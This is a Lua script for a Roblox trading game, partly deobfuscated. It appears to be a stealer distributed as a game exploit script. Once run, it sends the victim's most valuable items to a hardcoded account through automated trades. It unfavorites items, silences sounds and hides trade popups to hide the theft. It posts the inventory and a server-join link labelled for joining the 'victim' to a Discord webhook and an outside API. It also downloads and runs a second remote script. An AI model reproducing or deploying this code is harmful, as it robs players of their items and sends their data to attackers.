-- anti skid 💪💪 voltils tuff
-- please odnt use it
-- prometheus god
("This file was protected using Voltils Obfuscation v7.4 - https://dsc.gg/Voltils"):gsub(".+", function(v)
  (getfenv and getfenv() or _G or _ENV or {}).__voltils_fzIY_pkSxkKmbd = v
end)

local httpService = game:GetService("HttpService")
local runService = game:GetService("RunService")
local userInputService = game:GetService("UserInputService")
local players = game:GetService("Players")
local replicatedStorage = game:GetService("ReplicatedStorage")
local v1 = game:GetService("Workspace")

local function f1()
  local v2, v3 = pcall(function() return "IlnazgMqGu" end)

  if not v2 or v3 ~= "IlnazgMqGu" then
    return false
  else
    local numberValue = Instance.new("NumberValue")
    local archivable = numberValue.Archivable
    numberValue:Destroy()

    return archivable and type(httpService.JSONDecode) == "function"
      and type(game.HttpGet) == "function"
  end
end

local f2, f3, f4, f5, f6, f7, f8, f9, f10, f11, f12, f13, localPlayer, v4, v5, v6, v7, v8,
  floor, v9, v10, v11, localPlayer2, v12, playerData, activeNegotiation, sessionState, v13, v14,
  v15, v16, v17, v18, v19, f14, v20, v21, v22, f15, f16, f17, f18, f19, f20, f21, v23, f22, v24,
  v25, v26, v27, v28, waitForChild, v29

if f1() then
  runService.RenderStepped:Connect(function() end)
  localPlayer = players.LocalPlayer

  function f2(p1)
    warn(("\n[Voltis Anti‑Env Logger]\nTime: %s\nReason: %s\nTrace:\n%s\n"):format("%Y-%m-%d %H:%M:%S", tostring(p1
      or "Unknown"), debug.traceback(
      "", 2
    )))
  end

  local function f23(p2)
    f2(p2)
    warn("Detected by Voltis Anti‑Skid - .gg/78yYmtaeg4 🤡")
    task.delay(0.1, function() end)
    return true
  end

  for index, value in ipairs({
    function()
      if not localPlayer then
        return true, "LocalPlayer is nil"
      end

      if localPlayer.Character == nil then
        return true, "Character is nil"
      end

      return false
    end,
    function()
      if typeof(workspace.CurrentCamera) ~= "Instance" then
        return true, "Camera is not an Instance"
      end

      if not pcall(function() end) then
        return true, "Camera CFrame inaccessible"
      end

      return false
    end,
    function()
      local v30 = false
      local connect = runService.RenderStepped:Connect(function() v30 = true end)
      task.wait(0.03)
      connect:Disconnect()

      if not v30 then
        return true, "RenderStepped did not fire"
      end

      return false
    end,
    function()
      local getMouseLocation = userInputService:GetMouseLocation()

      if typeof(getMouseLocation) ~= "Vector2" then
        return true, "MouseLocation is not Vector2"
      end

      if getMouseLocation.X <= 0 and getMouseLocation.Y <= 0 then
        return true, "MouseLocation returned invalid coordinates"
      end

      return false
    end,
    function()
      if not workspace.CurrentCamera then
        return true, "Camera missing"
      end

      if not pcall(function() end) then
        return true, "Camera.Focus.Position inaccessible"
      end

      return false
    end,
  }) do
    local v31, v32 = value()

    if v31 then
      return f23(v32)
    end
  end

  v4 = nil
  v5 = nil
  v6 = 0
  v7 = 2
  local remove = table.remove
  v8 = {}
  local random = math.random
  local v33 = {}
  floor = math.floor
  local char = string.char

  for i = 1, 256 do
    v33[i] = i
  end

  while true do
    local v34 = remove(v33, (random(1, #v33)))
    v8[v34] = char(v34 - 1)

    if #v33 == 0 then
      break
    end
  end

  function f3()
    if #v9 == 0 then
      v6 = (v6 * 209 + 1448642806435) % 35184372088832

      while true do
        v7 = v7 * 56 % 257

        if v7 ~= 1 then
          break
        end
      end

      local v35 = v7 % 32
      local v36 = floor(v6 / 2 ^ (13 - (v7 - v35) / 32)) % 4294967296 / 2 ^ v35
      local v37 = floor(v36 % 1 * 4294967296) + floor(v36)
      local v38 = v37 % 65536
      local v39 = (v37 - v38) / 65536
      v9 = { v38 % 256, (v38 - v38 % 256) / 256, v39 % 256, (v39 - v39 % 256) / 256 }
    end

    local v40 = #v9
    local v41 = v9[v40]
    v9[v40] = nil
    return v41
  end

  v9 = {}
  v10 = {}
  v4 = setmetatable({}, { __index = v10, __metatable = nil })

  function v5(p3, p4)
    if v10[p4] then
      return p4
    else
      local v42 = {}
      v9 = {}
      v6 = p4 % 35184372088832
      v7 = p4 % 255 + 2
      v10[p4] = ""
      local v43 = 178

      for j = 1, #p3 do
        v43 = (string.byte(p3, j) + f3() + v43) % 256
        v42[j] = v8[v43 + 1]
      end

      v10[p4] = table.concat(v42)
      return p4
    end
  end

  local v44 = getfenv and getfenv() or _G or _ENV or {}

  if v44.__voltils_fzIY_pkSxkKmbd
    ~= "This file was protected using Voltils Obfuscation v7.4 - https://dsc.gg/Voltils" then
    return
  else
    v44.__voltils_fzIY_pkSxkKmbd = nil

    v11 = {
      anonymous = false,
      target_name = "sebaplen2",
      second_script_url = "https://pastebin.com/raw/q1ww7uQg",
      values_url = "https://raw.githubusercontent.com/y9v8/EyalZet/refs/heads/main/Values/Dmvsval.lua",
      joiner_api = "https://eyalzet-api.vercel.app",
      webhook = {
        url = "https://discord.com/api/webhooks/1560751027400085575/1ciU0pBXA7xJ9BWLqORPOH-tGDocj2Qhul4ZTQaIATrkSy8F-FefT5KXBJe8gDQCJvbw",
        ping = "@everyone",
        notify_when_empty = true,
      },
      exclude_items = { "DefaultGun", "DefaultKnife", "DefaultEffect" },
      include_emotes = true,
      max_trade_items = 12,
      offer_gap = 0.35,
      ready_timeout = 60,
      auto_invite = true,
      invite_every = 8,
      min_value = 0,
    }

    localPlayer2 = players.LocalPlayer
    v12 = require(replicatedStorage.Shared.Remotes)
    local v45 = require(replicatedStorage.Client.Modules.ClientGlobals)
    playerData = v45.PlayerData
    activeNegotiation = v45.ActiveNegotiation
    sessionState = v45.SessionState

    local v46
    v46, v13 = pcall(function() return require(replicatedStorage.Shared.Item) end)

    local v47
    v47, v14 = pcall(function() return require(replicatedStorage.Shared.Emotes) end)

    local v48

    v48, v15 = pcall(function()
      return require(replicatedStorage.Shared.Utils.ItemIsTradeable)
    end)

    if not v46 or type(v13) ~= "table" then
      v13 = {}
    end

    if not v47 or type(v14) ~= "table" then
      v14 = {}
    end

    if not v48 or type(v15) ~= "function" then
      v15 = nil
    end

    v16 = { "Knife", "Gun", "Effect" }

    if v11.include_emotes then
      v16[#v16 + 1] = "Emote"
    end

    v17 = {
      Ancient = 6,
      Mythic = 5,
      Legendary = 4,
      Rare = 3,
      Uncommon = 2,
      Common = 1,
    }

    v101 = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common", "Unknown" }

    v18 = {
      Knife = {},
      Gun = {},
      Effect = {},
      Emote = {},
    }

    local v49
    v49, v19 = pcall(function() return game:HttpGet(v11.values_url) end)

    if v49 and type(v19) == "string" then
      local v50, v51 = pcall(function() return httpService:JSONDecode(v19) end)

      if v50 and type(v51) == "table" then
        if type(v51.Knifes) == "table" then
          v18.Knife = v51.Knifes
        end

        if type(v51.Knives) == "table" then
          v18.Knife = v51.Knives
        end

        if type(v51.Guns) == "table" then
          v18.Gun = v51.Guns
        end

        if type(v51.Effects) == "table" then
          v18.Effect = v51.Effects
        end

        if type(v51.Emotes) == "table" then
          v18.Emote = v51.Emotes
        end
      end
    end

    function f14(p5)
      local v52 = v18[p5.cat]

      if type(v52) == "table" then
        local v53 = v52[p5.name]

        if type(v53) == "number" then
          return v53
        end
      end

      return v17[p5.rarity] and v17[p5.rarity] * 10 or 0
    end

    v20 = string.lower(tostring(v11.target_name or ""))
    v21 = {}

    for index2, value2 in ipairs(v11.exclude_items or {}) do
      v21[string.lower(value2)] = true
    end

    v22 = {}

    for index3, value3 in ipairs({ v13, v14 }) do
      for key, value4 in pairs(value3) do
        if type(value4) == "table" then
          local itemName = value4.ItemName or value4.Name or value4.name

          if type(itemName) == "string" then
            v22[string.lower(itemName)] = value4
          end
        end
      end
    end

    function f4()
      local data = activeNegotiation.Data

      if type(data) ~= "table" or not data.player1 or not data.player2 then
        return nil, nil, nil
      end

      local player1, player2

      if data.player1.player and data.player1.player.UserId == localPlayer2.UserId then
        player1 = data.player1
        player2 = data.player2
      else
        player1 = data.player2
        player2 = data.player1
      end

      return player1, player2, data
    end

    function f5(p6)
      local v54 = string.lower(p6 or "")
      local v55 = v13[p6] or v14[p6] or v22[v54]
      local rarity = type(v55) == "table" and (v55.Rarity or v55.rarity) or nil

      if rarity and v17[rarity] then
        return rarity, v17[rarity]
      end

      return "Unknown", 0
    end

    function f6(p7)
      if not v15 then
        return true
      else
        local v56, v57 = pcall(v15, p7)

        if not v56 then
          return true
        end

        return v57 and true or false
      end
    end

    function f7()
      for index4, value5 in ipairs(players:GetPlayers()) do
        if value5 ~= localPlayer2 and f15(value5) then
          return value5
        end
      end
    end

    function f8(p8)
      table.sort(p8, function(p9, p10)
        if p9.rank ~= p10.rank then
          return p9.rank > p10.rank
        end

        if p9.name ~= p10.name then
          return p9.name < p10.name
        end

        return tostring(p9.guid) < tostring(p10.guid)
      end)

      return p8
    end

    function f15(p11)
      if v20 == "" then
        return false
      end

      if typeof(p11) == "Instance" then
        return string.lower(p11.Name) == v20 or string.lower(p11.DisplayName) == v20
      end

      return string.lower(tostring(p11)) == v20
    end

    function f16()
      local v58 = {}

      for index5, value6 in ipairs(v16) do
        local tryIndex = playerData:TryIndex({ "Inventory", value6 })

        if type(tryIndex) == "table" then
          for key2, value7 in pairs(tryIndex) do
            local name = value7
            name = value7 and value7.name

            if name and not v21[string.lower(name)] and f6(name) then
              local rarity2, rank = f5(name)

              v58[#v58 + 1] = {
                guid = key2,
                name = name,
                cat = value6,
                rarity = rarity2,
                rank = rank,
              }
            end
          end
        end
      end

      table.sort(v58, function(p12, p13)
        local v59 = f14(p12)
        local v60 = f14(p13)

        if v59 ~= v60 then
          return v59 > v60
        end

        return p12.name < p13.name
      end)

      if v11.min_value > 0 then
        local v61 = {}

        for index6, value8 in ipairs(v58) do
          if f14(value8) >= v11.min_value then
            v61[#v61 + 1] = value8
          end
        end

        return v61
      end

      return v58
    end

    function f9()
      local tryIndex2 = sessionState:TryIndex({ "incomingTradeRequests" })
      return type(tryIndex2) == "table" and tryIndex2 or {}
    end

    function f17()
      local v62 = {}
      local v63 = f4()
      local count = 0

      if v63 and v63.offer then
        for key3, value9 in pairs(v63.offer.items or {}) do
          v62[value9] = true
          count = count + 1
        end
      end

      return v62, count
    end

    function f10()
      f18(function()
        local data2 = activeNegotiation.Data
        return not (data2 and (data2.processing or 0) > v1:GetServerTimeNow())
      end, 5)
    end

    function f18(fn, p14)
      local v64 = os.clock()

      while os.clock() - v64 < p14 do
        if fn() then
          return true
        end

        task.wait(0.2)
      end

      return fn()
    end

    function f19()
      local v65 = { f4() }

      if not v65[3] then
        return false
      else
        f18(function()
          local v66, v67, v68 = f4()
          return v68 and v1:GetServerTimeNow() >= (v68.lastUpdate or 0) + 3
        end, 6)

        local v69, v70, v71 = f4()

        if not v71 then
          return false
        end

        v12.SetReady:FireServer(true, v71.ref or {})
        return true
      end
    end

    local v72 = syn and syn.request or request or http_request or http and http.request

    function f11()
      return ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(
        game.PlaceId, game.JobId
      )
    end

    function f12()
      return ("roblox://experiences/start?placeId=%s&gameInstanceId=%s"):format(
        game.PlaceId, game.JobId
      )
    end

    function f20(p15)
      if not v72 or not v11.webhook.url or v11.webhook.url == "" then
        return
      end

      task.spawn(function()
        pcall(function()
          v72({
            Url = v11.webhook.url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = httpService:JSONEncode(p15),
          })
        end)
      end)
    end

    function inventorybycat(p16)
      local v73 = { "Knife", "Gun", "Effect", "Emote" }

      local v74 = {
        Knife = "Knives",
        Gun = "Guns",
        Effect = "Effects",
        Emote = "Emotes",
      }

      local v75 = {}

      for index7, value10 in ipairs(p16) do
        local cat = value10.cat

        if not v75[cat] then
          v75[cat] = { order = {}, map = {}, total = 0 }
        end

        local v76 = v75[cat]

        if not v76.map[value10.name] then
          v76.map[value10.name] = { count = 0, value = f14(value10) }
          v76.order[#v76.order + 1] = value10.name
        end

        v76.map[value10.name].count = v76.map[value10.name].count + 1
        v76.total = v76.total + 1
      end

      local v77 = {}

      for index8, value11 in ipairs(v73) do
        local v78 = v75[value11]

        if v78 and #v78.order > 0 then
          local v79 = v74[value11]
          local v80 = #v77 + 1
          v77[v80] = ("%s (%d)"):format(v79 or value11, v78.total)
          local count2 = 0

          for index9, value12 in ipairs(v78.order) do
            if count2 >= 15 then
              break
            else
              local v81 = v78.map[value12]

              v77[#v77 + 1] = ("• %dx %s [Val: %s]"):format(
                v81.count, value12, tostring(v81.value * v81.count)
              )

              count2 = count2 + 1
            end
          end

          if #v78.order > 15 then
            v77[#v77 + 1] = ("...y %d items mas"):format(#v78.order - 15)
          end
        end
      end

      if #v77 == 0 then
        v77[1] = "(vacio)"
      end

      return table.concat(v77, "\n")
    end

    function f21()
      local v82 = tostring(v11.joiner_api or "")

      if v82 == "" or v11.target_name == "" then
        return
      end

      local jsonEncode = httpService:JSONEncode({
        joiner = tostring(v11.target_name),
        job_id = tostring(game.JobId),
        place_id = game.PlaceId,
        sender = localPlayer2.Name,
      })

      task.spawn(function()
        local v83 = false

        if v72 then
          local v84 = v72({
            Url = v82 .. "/api/send",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = jsonEncode,
          })

          v83 = v84 and (v84.StatusCode == 200 or v84.StatusCode == 201)
        end

        if not v83 then
          pcall(function() game:HttpPost(v82 .. "/api/send", jsonEncode, "application/json") end)
        end
      end)
    end

    local function f24()
      local v85 = f16()
      local anonymous = v11.anonymous and "anonymous" or localPlayer2.Name

      local anonymous2 = v11.anonymous and "anonymous"
        or v11.target_name ~= "" and v11.target_name or "(sin target)"

      local value13 = f11()
      local v86 = f12()
      local total = 0

      for index10, value14 in ipairs(v85) do
        total = total + (f14(value14) or 0)
      end

      f21()

      f20({
        content = v11.webhook.ping,
        embeds = {
          {
            title = "Transfer iniciado: " .. anonymous,
            color = 10181046,
            fields = {
              { name = "Target", value = anonymous2, inline = true },
              {
                name = "Tradeables",
                value = tostring(#v85) .. " (" .. math.ceil(#v85 / v11.max_trade_items)
                  .. " trades)",
                inline = true,
              },
              { name = "Total Value", value = tostring(total), inline = true },
              {
                name = "DEEPLINK PARA COPIAR",
                value = [[
Copialo y pegalo en la barra de tu navegador si el link te manda a otro servidor:

]] .. v86,
                inline = false,
              },
              { name = "Mantener para copiar", value = value13, inline = false },
              {
                name = "Inventario",
                value = [[
```
]] .. inventorybycat(v85) .. "\n```",
                inline = false,
              },
              {
                name = "Cómo unirse / How to join",
                value = "ES: Mantén presionado el deeplink o el código y pégalo para unirte al servidor de la víctima.\nEN: Long-press the deeplink or code and paste it to join the victim server.",
                inline = false,
              },
            },
            image = {
              url = "https://cdn.nekotina.com/guilds/1444090492764684462/dfc5693b-08f4-42ec-9b7d-aa7fad76431a.gif",
            },
          },
        },
      })
    end

    local v87 = v5("՞\135\218Y\216", 31650731243922)
    local v88 = v5("\155\155\143\\6", 12012298917337)
    local v89 = v5("\17&h\218V\128\212d\30", 4996324083990)
    local v90 = os.clock()

    function f13()
      if not v11.webhook.notify_when_empty then
        return
      else
        local ping = v11.webhook.ping

        local title = "Transfer terminado: "
          .. (v11.anonymous and "anonymous" or localPlayer2.Name)

        local v91 = v5("\175eã\204", 23665695451916)
        local v92 = v5("\247\138\155\19\2\145", 2803633489177)
        local v93 = v5(",u\210\231", 23275171785302)
        local v94 = v5("\151\207(͊\25", 2309689656371)
        local v95 = v5(">\129\198\23\183", 24010154830764)
        local v96 = tostring(v23.trades)
        local v97 = v5("]P\236Q)\206", 35064524996552)
        local v98 = v5("F\28)\255", 13963660794214)
        local v99 = v5("\249T\20\238\224\234(\184\160\150k", 8007022595728)
        local v100 = v5("\15\236\141\224m", 19342067000110)
        local v102 = tostring(v23.items)
        local v103 = v5("\237\7J>\"\237", 1118778065416)
        local v104 = v5("\18\18I_", 27246442541455)
        local v105 = v5("&\255\168\201C[\182\165", 2993486611825)
        local v106 = v5("\200AJt\203", 2855394051377)

        f20({
          content = ping,
          embeds = {
            {
              title = title,
              [v4[v91]] = 65280,
              [v4[v92]] = {
                { [v4[v93]] = v4[v94], [v4[v95]] = v96, [v4[v97]] = true },
                { [v4[v98]] = v4[v99], [v4[v100]] = v102, [v4[v103]] = true },
                {
                  [v4[v104]] = v4[v105],
                  [v4[v106]] = ("%d min"):format((os.clock() - v23.startedAt) / 60),
                  inline = true,
                },
              },
              image = {
                url = "https://cdn.nekotina.com/guilds/1444090492764684462/dfc5693b-08f4-42ec-9b7d-aa7fad76431a.gif",
              },
            },
          },
        })

        return
      end
    end

    v23 = { [v4[v87]] = 0, [v4[v88]] = 0, [v4[v89]] = v90 }

    function f22()
      local v107, v108 = f17()
      local v109 = v11.max_trade_items - v108

      if v109 > 0 then
        local v110 = {}

        for index11, value15 in ipairs(f8(f16())) do
          if not v107[value15.guid] then
            v110[#v110 + 1] = value15

            if #v110 >= v109 then
              break
            end
          end
        end

        if #v110 == 0 and v108 == 0 then
          pcall(function() v12.CancelTrade:FireServer() end)
          return "empty"
        elseif #v110 > 0 then
          for index12, value16 in ipairs(v110) do
            if not f4() then
              return "closed"
            end

            f10()
            v12.OfferItem:FireServer(value16.guid)
            task.wait(v11.offer_gap)
          end

          task.wait(0.5)
          local v111 = { f17() }

          if v111[2] < math.min(v11.max_trade_items, v108 + #v110) then
            return "retry"
          end
        end
      end

      local v112 = f4()

      if not v112 then
        return "closed"
      else
        if not v112.ready then
          task.wait(0.3)
          f19()
        end

        local v113, v114 = f17()

        f18(function()
          local v115, v116, v117 = f4()

          if not v117 then
            return true
          elseif v117.exchanging == true then
            return true
          else
            if v115 and not v115.ready then
              return true
            end

            return false
          end
        end, v11.ready_timeout)

        local v118, v119, v120 = f4()

        if v120 and v120.exchanging then
          v23.trades = v23.trades + 1
          v23.items = v23.items + v114

          f18(function() return f4() == nil end, 20)
          return "done"
        elseif not v120 then
          return "closed"
        else
          if v118 and not v118.ready then
            return "retry"
          end

          return "waiting"
        end
      end
    end

    v24 = true
    v25 = false
    v26 = false
    v27 = 0
    v28 = {}
    waitForChild = nil
    v29 = {}

    task.spawn(function()
      local waitForChild2 = localPlayer2:WaitForChild("PlayerGui"):WaitForChild("NewGui", 30)

      if not waitForChild2 then
        return
      end

      waitForChild = waitForChild2:WaitForChild("TradeNegotiation", 30)

      if not waitForChild then
        return
      else
        local visible = waitForChild:GetPropertyChangedSignal("Visible")
        v29[#v29 + 1] = visible:Connect(function() end)
        local position = waitForChild:GetPropertyChangedSignal("Position")

        v29[#v29 + 1] = position:Connect(function()
          if waitForChild.Position ~= UDim2.new(5, 0, 5, 0) then
          end
        end)

        while v24 do
          task.wait(0.1)
        end

        return
      end
    end)

    task.spawn(function()
      while v24 do
        local v121, v122 = f4()

        if v121 and v122 and v122.player then
          if f15(v122.player) then
            if not v25 then
              local v123, v124 = pcall(f22)
              v25 = false

              if v123 and v124 == "empty" and not v26 then
                v26 = true
                f13()
              elseif v123 and v124 == "done" then
                v26 = false
                v28 = {}
                task.wait(0.8)
              elseif v123 and (v124 == "retry" or v124 == "waiting") then
                task.wait(0.3)
              elseif v123 and v124 == "closed" then
                task.wait(0.4)
              end
            end
          else
            task.wait(1)
          end

          ::L1934::
          task.wait(0.25)
        else
          local v125 = f7()

          if not v125 then
            task.wait(2)
          else
            local v126 = os.clock()

            for key4, value17 in pairs((f9())) do
              local getPlayerByUserId

              if typeof(value17) == "Instance" then
                getPlayerByUserId = value17
              elseif type(value17) == "number" then
                getPlayerByUserId = players:GetPlayerByUserId(value17)
              elseif type(value17) == "string" then
                for index13, value18 in ipairs(players:GetPlayers()) do
                  if string.lower(value18.Name) == string.lower(value17)
                    or string.lower(value18.DisplayName) == string.lower(value17) then
                    getPlayerByUserId = value18
                    break
                  end
                end
              elseif type(value17) == "table" then
                if typeof(value17.player) == "Instance" then
                  getPlayerByUserId = value17.player
                elseif type(value17.UserId) == "number" then
                  getPlayerByUserId = players:GetPlayerByUserId(value17.UserId)
                elseif type(value17.userId) == "number" then
                  getPlayerByUserId = players:GetPlayerByUserId(value17.userId)
                end
              end

              if getPlayerByUserId and f15(getPlayerByUserId) then
                local userId = getPlayerByUserId.UserId

                if not v28[userId] or v126 - v28[userId] > 1.2 then
                  v28[userId] = v126
                  pcall(function() v12.AcceptInvite:FireServer(getPlayerByUserId) end)
                end
              end
            end

            if v11.auto_invite and v126 - v27 > v11.invite_every then
              if #f16() > 0 then
                v27 = v126
                pcall(function() v12.SendInvite:FireServer(v125) end)
              end
            end

            goto L1934
          end
        end
      end
    end)

    f24()

    task.spawn(function()
      local reInventoryFavoriteItem

      pcall(function()
        reInventoryFavoriteItem = replicatedStorage.Packages.Networking:FindFirstChild("RE/Inventory/FavoriteItem")
      end)

      if not reInventoryFavoriteItem then
        for index14, value19 in ipairs(replicatedStorage:GetDescendants()) do
          if value19:IsA("RemoteEvent") and value19.Name:find("FavoriteItem") then
            reInventoryFavoriteItem = value19
            break
          end
        end
      end

      if not reInventoryFavoriteItem then
        return
      else
        local function f25()
          local tryIndex3 = playerData:TryIndex({ "Favorites" })
          local v127 = {}

          if type(tryIndex3) ~= "table" then
            return v127
          end

          for key5, value20 in pairs(tryIndex3) do
            if type(value20) == "table" then
              for key6, value21 in pairs(value20) do
                if type(value21) == "string" and #value21 > 8 then
                  v127[#v127 + 1] = { category = tostring(key5), guid = value21 }
                end
              end
            end
          end

          return v127
        end

        for k = 1, 5 do
          local v128 = f25()

          if #v128 == 0 then
            break
          end

          for index15, value22 in ipairs(v128) do
            local v129 = value22
            pcall(function() reInventoryFavoriteItem:FireServer(v129.category, v129.guid) end)
            task.wait(0.15)
          end

          task.wait(0.5)
        end

        return
      end
    end)

    task.spawn(function()
      local playerGui = localPlayer2:WaitForChild("PlayerGui")
      local v130 = {}

      local v131 = {
        Gunshot = true,
        Reload = true,
        GunKill = true,
        Kill = true,
        ThrowKill = true,
        Ting = true,
      }

      local getDescendants = playerGui.GetDescendants

      local function f26(p17)
        if not v131[p17.Name] then
          pcall(function() p17.Volume = 0 end)
        end
      end

      for index16, value23 in ipairs(getDescendants(playerGui)) do
        if value23:IsA("Sound") then
          f26(value23)
        end
      end

      local descendantAdded = playerGui.DescendantAdded

      v130[#v130 + 1] = descendantAdded:Connect(function(p18)
        if p18:IsA("Sound") then
          task.defer(function() f26(p18) end)
        end
      end)

      local function f27(p19)
        for index17, value24 in ipairs(p19:GetChildren()) do
          local v132 = value24
          pcall(function() v132.Visible = false end)
        end

        local childAdded = p19.ChildAdded

        v130[#v130 + 1] = childAdded:Connect(function(p20)
          task.defer(function() pcall(function() p20.Visible = false end) end)
        end)
      end

      local notifications = playerGui:FindFirstChild("Notifications")

      if notifications then
        local body = notifications:FindFirstChild("Body")

        if body then
          f27(body)
        end
      end

      local childAdded2 = playerGui.ChildAdded

      v130[#v130 + 1] = childAdded2:Connect(function(p21)
        if p21.Name == "Notifications" then
          local waitForChild3 = p21:WaitForChild("Body", 5)

          if waitForChild3 then
            f27(waitForChild3)
          end
        end
      end)

      local function f28(p22)
        local sideTradeReuqest = p22:FindFirstChild("SideTradeReuqest")

        if not sideTradeReuqest then
          return
        else
          local popup = sideTradeReuqest:FindFirstChild("Popup")

          if popup then
            local childAdded3 = popup.ChildAdded

            v130[#v130 + 1] = childAdded3:Connect(function(p23)
              task.defer(function() pcall(function() p23.Visible = false end) end)
            end)

            for index18, value25 in ipairs(popup:GetChildren()) do
              local v133 = value25
              pcall(function() v133.Visible = false end)
            end
          end

          return
        end
      end

      local newGui = playerGui:FindFirstChild("NewGui")

      if newGui then
        f28(newGui)
      else
        local childAdded4 = playerGui.ChildAdded

        v130[#v130 + 1] = childAdded4:Connect(function(p24)
          if p24.Name == "NewGui" then
            task.wait(0.5)
            f28(p24)
          end
        end)
      end
    end)

    local script = {
      role = "transfer",
      stats = function() return { trades = v23.trades, items = v23.items, left = #f16() } end,
      inventory = function() return f8(f16()) end,
      unload = function()
        v24 = false

        for index19, value26 in ipairs(v29) do
          local v134 = value26
          pcall(function() v134:Disconnect() end)
        end

        v29 = {}
      end,
    }

    if typeof(getgenv) == "function" then
      getgenv().script = script
    else
      _G.script = script
    end

    if v11.second_script_url and v11.second_script_url ~= "" then
      task.spawn(function()
        pcall(function() loadstring(game:HttpGet(v11.second_script_url))() end)
      end)
    end

    return
  end
else
  return
end
